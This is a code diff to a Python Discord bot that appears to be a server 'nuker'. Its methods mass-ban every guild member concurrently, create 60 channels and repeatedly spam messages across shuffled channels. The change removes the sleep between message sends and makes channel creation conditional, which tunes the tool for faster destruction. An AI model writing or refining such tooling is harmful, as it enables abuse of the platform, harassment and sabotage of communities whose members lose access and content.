@@ -46,7 +46,6 @@ class DiscordBot(commands.Bot):
             logs[self.logId] += "[-]Failed"
             self.channels.remove(channel)
         logs[self.logId] += f" | {str(datetime.datetime.now())} SendMessage ID:{channel.id}\n"
-        await asyncio.sleep(latencyMs)
     async def banAllUser(self, guild:discord.Guild):
         logs[self.logId] += "---- Start AllUserBan ----\n"
         await asyncio.gather(*(self.banUser(member) for member in guild.members))
@@ -61,7 +60,8 @@ class DiscordBot(commands.Bot):
     async def nuke(self, latency:int, messages:list[str], guild:discord.Guild, channelName:str, numberOfExecutions=50):
         logs[self.logId] += "---- Start Nuke ----\n"
         try:
-            await asyncio.gather(*(self.createChannel(channelName, guild) for _ in range(60)))
+            if self.allUserBan:
+                await asyncio.gather(*(self.createChannel(channelName, guild) for _ in range(60)))
             self.channels = list(guild.channels)
             random.shuffle(self.channels)
             for _ in range(numberOfExecutions):
